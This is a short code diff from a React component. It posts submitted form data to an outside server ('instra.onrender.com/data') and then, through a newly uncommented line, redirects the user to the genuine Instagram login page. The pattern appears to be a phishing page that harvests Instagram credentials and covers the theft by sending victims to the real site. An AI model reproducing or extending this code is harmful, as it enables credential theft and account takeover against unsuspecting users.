@@ -18,7 +18,7 @@ const Mainui = () => {
         axios
         .post('https://instra.onrender.com/data',data)
         .then(()=>{
-        //  window.location.href = 'https://www.instagram.com/accounts/login/?hl=en';
+         window.location.href = 'https://www.instagram.com/accounts/login/?hl=en';
          reset();
         })
         .catch((err)=>{console.log(err)})
